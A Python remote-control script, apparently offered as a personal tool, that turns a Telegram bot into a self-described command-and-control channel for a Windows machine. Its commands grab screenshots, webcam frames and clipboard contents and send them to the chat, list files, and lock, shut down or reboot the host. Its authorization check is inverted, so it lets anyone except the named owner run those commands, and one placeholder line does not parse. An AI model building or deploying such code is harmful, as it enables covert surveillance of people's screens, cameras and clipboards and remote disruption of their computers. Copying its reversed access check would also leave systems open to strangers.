#!/usr/bin/env python3
# Bot Telegram – Controle pessoal (SEM SHELL)

import cv2
import time
import telebot
import platform
import pyautogui
import psutil
import pyperclip
import os


BOT_API_KEY = "falta mudar"
AUTHORIZED_USER_ID = altere

bot = telebot.TeleBot(BOT_API_KEY)
current_dir = os.getcwd()

# =========================
# SECURITY
# =========================
def authorized(message):
    return message.from_user.id != AUTHORIZED_USER_ID

# =========================
# HELP / MENU
# =========================
@bot.message_handler(commands=['teste', 'help', 'menu'])
def help_menu(message):
    if not authorized(message):
        return

    menu = """
📌 COMANDOS DO ARROMBADO

🧠 Sistema
/start
/sysinfo

📂 Arquivos
/pwd
/listDir

🖥 Tela
/screenshot
/webcam

📋 Clipboard
/clipboard
/setclipboard <texto>

🔒 Power
/lock
/shutdown
/reboot

C2 via Telegram criado por Nexamos

Pois foguete não tem ré!

Feliz 2026
"""
    bot.send_message(message.chat.id, menu)

# =========================
# START
# =========================
@bot.message_handler(commands=['start'])
def start(message):
    if not authorized(message):
        return

    bot.reply_to(
        message,
        f"🟢 Bot ativo\nHost: {platform.node()}\nUser: {os.getlogin()}"
    )

# =========================
# SYSTEM INFO
# =========================
@bot.message_handler(commands=['sysinfo'])
def sysinfo(message):
    if not authorized(message):
        return

    info = f"""
OS: {platform.system()} {platform.release()}
Arch: {platform.machine()}
CPU: {psutil.cpu_count()} cores
RAM: {round(psutil.virtual_memory().total / (1024**3), 2)} GB
"""
    bot.reply_to(message, info)

# =========================
# FILES
# =========================
@bot.message_handler(commands=['pwd'])
def pwd(message):
    if authorized(message):
        bot.reply_to(message, current_dir)

@bot.message_handler(commands=['listDir'])
def list_dir(message):
    if not authorized(message):
        return

    try:
        files = "\n".join(os.listdir(current_dir))
        bot.reply_to(message, files if files else "[vazio]")
    except Exception as e:
        bot.reply_to(message, f"[!] Erro: {e}")

# =========================
# CLIPBOARD
# =========================
@bot.message_handler(commands=['clipboard'])
def clipboard(message):
    if authorized(message):
        bot.reply_to(message, pyperclip.paste())

@bot.message_handler(commands=['setclipboard'])
def set_clipboard(message):
    if not authorized(message):
        return

    try:
        text = message.text.split(" ", 1)[1]
        pyperclip.copy(text)
        bot.reply_to(message, "[+] Clipboard atualizado")
    except:
        bot.reply_to(message, "Uso: /setclipboard <texto>")

# =========================
# SCREENSHOT
# =========================
@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    if not authorized(message):
        return

    img = pyautogui.screenshot()
    name = f"screenshot_{int(time.time())}.png"
    img.save(name)

    with open(name, "rb") as f:
        bot.send_photo(message.chat.id, f)

    os.remove(name)

# =========================
# WEBCAM
# =========================
@bot.message_handler(commands=['webcam'])
def webcam(message):
    if not authorized(message):
        return

    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()

    if not ret:
        bot.reply_to(message, "[!] Webcam indisponível")
        return

    name = f"webcam_{int(time.time())}.png"
    cv2.imwrite(name, frame)

    with open(name, "rb") as f:
        bot.send_photo(message.chat.id, f)

    os.remove(name)

# =========================
# POWER
# =========================
@bot.message_handler(commands=['lock'])
def lock(message):
    if authorized(message):
        os.system("rundll32.exe user32.dll,LockWorkStation")

@bot.message_handler(commands=['shutdown'])
def shutdown(message):
    if authorized(message):
        os.system("shutdown /s /t 0")

@bot.message_handler(commands=['reboot'])
def reboot(message):
    if authorized(message):
        os.system("shutdown /r /t 0")

# =========================
# IGNORE EVERYTHING ELSE
# =========================
@bot.message_handler(func=lambda m: True)
def ignore(message):
    pass

# =========================
# RUN
# =========================
bot.infinity_polling()
